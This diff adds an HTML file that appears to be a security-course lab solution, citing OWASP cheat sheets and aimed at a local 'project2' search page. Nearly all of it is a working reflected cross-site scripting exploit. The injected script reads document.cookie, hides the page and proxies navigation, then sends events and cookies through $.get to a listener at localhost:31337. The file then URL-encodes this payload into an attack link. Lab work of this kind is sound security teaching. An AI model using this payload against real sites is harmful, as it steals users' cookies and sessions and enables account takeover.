@@ -1,0 +1,46 @@
+<!--
+COLLABORATORS: N/A
+REFERENCES:
+- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html,
+- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+-->
+
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+function payload(attacker) {
+    var cookies = document.cookie;
+    alert("csrf token: " + cookies);
+    
+    function log(data) {
+        console.log($.param(data));
+        try {
+            $.get(attacker, data);
+        } catch(e) {}
+    }
+    
+    function proxy(href) {
+        $("html").load(href, function(){
+            $("html").show();
+            log({
+                event: "nav", 
+                uri: href, 
+                accessible_cookies: document.cookie,
+            });
+        });
+    }
+    
+    $("html").hide();
+    proxy("./");
+}
+
+// The actual payload that gets injected
+var payloadScript = "<script" + ">" + payload.toString() + ";payload('http://localhost:31337/');</script" + ">";
+
+// Display the URL-encoded version for copying
+var target = "http://localhost/project2/";
+var url = target + "search?xssdefense=0&csrfdefense=1&q=" + encodeURIComponent(payloadScript);
+
+document.write("<h3>Generated URL:</h3>");
+document.write("<textarea style='width: 100%; height: 100px;'>" + url + "</textarea>");
+</script>
